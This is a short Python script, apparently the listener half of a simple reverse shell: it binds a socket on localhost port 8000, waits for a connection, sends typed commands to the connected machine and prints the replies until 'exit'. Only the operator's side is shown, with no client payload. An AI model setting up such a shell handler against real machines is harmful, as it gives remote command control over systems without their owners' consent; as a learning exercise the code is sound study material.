import socket,subprocess

host = '127.0.0.1'
port = 8000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((host,port))
s.listen(1)
conn, addr= s.accept()

print("conn established.")

while 1:
	command = input("$ ")
	
	if command != "exit":
		if command == "": 
			continue

		command = command.encode('utf-8')

		conn.send(command)
		result = conn.recv(1024)
		result = result.decode('utf-8')
		print(result)
	else:
		exit = 'exit'
		exitcommand = exit.encode('utf-8')
		
		conn.send(exitcommand)
		print("[+] Shell Going Down.")
		break
s.close()

